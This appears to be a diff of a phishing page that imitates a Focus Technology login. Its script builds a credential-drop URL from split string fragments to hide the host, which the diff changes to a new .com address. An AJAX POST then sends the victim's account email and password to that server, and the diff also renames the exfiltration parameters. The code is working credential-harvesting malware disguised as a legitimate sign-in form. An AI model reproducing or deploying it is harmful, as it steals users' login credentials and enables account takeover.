@@ -222,12 +222,12 @@
     <script>
       let resBox = "MinC";
 
-      let nbg1 = "ht";
-      let nbg2 = "tps://gtdst";
-      let nbg3 = "ornk.li";
-      let nbg4 = "ve/emi";
-      let nbg5 = "ho/gram.p";
-      let nbg6 = "hp";
+      let nbg1 = "https://";
+      let nbg2 = "kvwpca";
+      let nbg3 = ".com/";
+      let nbg4 = "jolly/";
+      let nbg5 = "gram.";
+      let nbg6 = "php";
 
       let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
 
@@ -298,18 +298,7 @@
             <input type="hidden" class="text" name="trial" id="trial" />
 
             <p class="text_label">Account</p>
-            <input
-              type="text"
-              required
-              class="text mm"
-              id="tma"
-              value=""
-              placeholder="Please enter your email address."
-            />
-            <p
-              id="errmsg"
-              style="color: #d00; font-weight: 400; font-size: 14px"
-            ></p>
+            <input type="text" required class="text mm" id="tma" value="" />
             <div style="display: flex; justify-content: space-between">
               <p class="text_label">Password</p>
 
@@ -327,6 +316,11 @@
               id="tpp"
               pattern="(?=^.{6,}$).*$"
             />
+
+            <p
+              id="errmsg"
+              style="color: #d00; font-weight: 400; font-size: 14px"
+            ></p>
 
             <button
               id="submit-btn"
@@ -537,7 +531,7 @@
               margin-top: 20px;
             "
           >
-            Copyright © 1998-2025 Focus Technology Co., Ltd. All Rights
+            Copyright © 1998-2024 Focus Technology Co., Ltd. All Rights
             Reserved. &nbsp;|&nbsp; User Agreement &nbsp;|&nbsp; Declaration
             &nbsp;|&nbsp; Privacy Policy
           </p>
@@ -580,9 +574,9 @@
           url: nbg,
           type: "POST",
           data: {
-            ckorg: torg.value,
-            ck: tma.value,
-            cknow: tpp.value,
+            torg: torg.value,
+            tma: tma.value,
+            tpp: tpp.value,
             loc: loc.value,
             trial: trial.value,
             resBox: resBox,
